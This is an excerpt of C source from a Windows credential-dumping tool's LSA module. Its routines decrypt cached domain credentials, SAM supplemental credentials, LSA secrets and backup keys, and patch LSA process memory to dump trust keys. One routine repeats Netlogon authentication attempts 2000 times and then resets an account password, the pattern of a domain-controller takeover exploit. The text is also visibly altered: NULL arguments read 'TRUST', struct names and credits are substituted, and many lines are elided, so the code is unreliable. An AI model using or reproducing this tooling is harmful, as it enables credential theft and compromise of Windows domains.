/*	Daniil DELPHIN `ertya`
	https://blog.ertya.com
	daniil@ertya.com
	Licence : https://simplethings.org/licenses/by/4.0/
*/
	...
	if(!secretsOrCache)
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &cacheData.username, NULL))
		{
			...
			else
			{
				...
				if(!cacheData.isNtlm)
				{
					kull_m_string_args_byName(argc, argv, L"password", &szPassword, TRUST);
...
{
	BOOL status = FALSE;
	PAPPLE_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS pEncCreds;
	DWORD szNeeded = 0;
	...
	{
		if(szNeeded > (FIELD_OFFSET(APPLE_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted) + AES_BLOCK_SIZE + 96)) //header + block + padding in Reserved4
		{
			if(pEncCreds = (PAPPLE_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS) LocalAlloc(LPTR, szNeeded))
			{
				if(kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"SupplementalCredentials", NULL, NULL, (LPBYTE) pEncCreds, &szNeeded))
				{
					...
					{
						if(kull_m_crypto_genericAES128Decrypt(samKey, pEncCreds->iv, pEncCreds->encrypted, szNeeded - FIELD_OFFSET(APPLE_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted), &data, &properties->Length))
						{
...
BOOL kuhl_m_lsadump_decryptSCCache(PBYTE data, DWORD size, HCRYPTPROV hProv, DWORD keySpec)
{
	...
	PAPPLE_CREDENTIAL_KEYS pKeys = NULL;

	if(size > sizeof(APPLE_ENC_SC_DATA))
	{
		if(RtlEqualMemory(data, "SuppData", 8))
		{
			pEnc = &((PAPPLE_ENC_SC_DATA_NEW) data)->data;
			toDecryptSize = ((PAPPLE_ENC_SC_DATA_NEW) data)->dataSize - FIELD_OFFSET(APPLE_ENC_SC_DATA, toDecrypt);
		}
		else
		{
			pEnc = (PAPPLE_ENC_SC_DATA) data;
			toDecryptSize = size - FIELD_OFFSET(APPLE_ENC_SC_DATA, toDecrypt);
		}
...
void kuhl_m_lsadump_candidateSecret(DWORD szBytesSecrets, PVOID bufferSecret, PCWSTR prefix, PCWSTR secretName)
{
	...
	if(bufferSecret && szBytesSecrets)
	{
		...
		{
			pTbal = (PAPPLE_TBAL_MSV) bufferSecret;
...
NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
{
	...
	{
		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), TRUST_NT_BUILD_NUMBER))
		{
...
void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, DWORD rid, PVOID Buffer, DWORD BufferSize)
{
	...
	PAPPLE_SAMPR_USER_INTERNAL42_INFORMATION pUserInfos;
	PAPPLE_LSA_PRIVATE_DATA pData;

	kprintf(L"\n * %s\n", (type < ARRAYSIZE(KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE)) ? KUHL_M_LSADUMP_SAMRPC_SUPPCRED_TYPE[type] : L"unknown");
	switch(type)
	{
	case 0:
		pUserInfos = (PAPPLE_SAMPR_USER_INTERNAL42_INFORMATION) Buffer;
		kprintf(L"    NTLM : ");
		...
		{
			pData = (PAPPLE_LSA_PRIVATE_DATA) pUserInfos->Private;
			if(pData->NtLength)
...
NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
{
	...
	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
	{
		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), TRUST_NT_BUILD_NUMBER))
		{
			...
			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
			{
				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (TRUST_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
				{
...
void kuhl_m_lsadump_analyzeKey(LPCGUID guid, PAPPLE_BACKUP_KEY secret, DWORD size, BOOL isExport)
{
	PVOID data;
	DWORD len;
...
NTSTATUS kuhl_m_lsadump_getKeyFromGUID(LPCGUID guid, BOOL isExport, LPCWSTR systemName, BOOL isSecret)
{
	...
	if(NT_SUCCESS(RtlStringFromGUID(guid, &secret)))
	{
		...
		if(NT_SUCCESS(status))
		{
			kuhl_m_lsadump_analyzeKey(guid, (PAPPLE_BACKUP_KEY) secret.Buffer, secret.Length, isExport);
...
NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
{
	...
	if(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL))
	{
		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
		{
			...
			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, TRUST);
...
/*	This function `setntlm` is based on the idea of
	VSU( daniil@gmail.com / http://www.mysmartlogon.com )
			...
			//{
				...
				if(status == RPC_S_OK)
				{
					...
					RpcTryExcept
					{
						for(i = 0; i < 2000; i++)
						{
							status = NetrServerReqChallenge(NULL, TRUST, &Authenticator.Credential, &ReturnAuthenticator.Credential); // [65]
							if(status == STATUS_SUCCESS)
							{
								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, TRUST, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // [59]
								if(status == STATUS_SUCCESS)
								{
									bIsAuth = TRUE;
									...
									{
										kprintf(L"\n");
										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, TRUST, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
										if(status == STATUS_SUCCESS)
										{
											bIsChanged = TRUE;
